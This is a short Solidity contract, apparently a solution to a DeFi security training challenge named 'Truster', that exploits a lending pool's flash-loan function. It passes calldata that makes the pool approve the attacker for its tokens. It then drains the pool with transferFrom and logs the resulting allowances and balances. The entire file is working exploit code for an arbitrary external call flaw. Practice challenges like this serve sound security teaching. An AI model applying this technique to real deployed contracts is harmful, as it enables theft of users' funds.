// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../truster/TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract TrusterAttacker {
    constructor(
        uint256 amount,
        address poolAddress,
        address tokenAddress
    ) {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), amount);
        TrusterLenderPool(poolAddress).flashLoan(0, msg.sender, tokenAddress, data);
        console.log("e0 token allowance : ", IERC20(tokenAddress).allowance(poolAddress, address(this)));
        IERC20(tokenAddress).transferFrom(poolAddress, msg.sender, amount);
        console.log("e1 msg.sender : ", msg.sender);
        console.log("e1 msg.sender bal: ",  IERC20(tokenAddress).balanceOf(msg.sender));
        console.log("e1 token allowance : ", IERC20(tokenAddress).allowance(poolAddress, address(this)));
    }
}
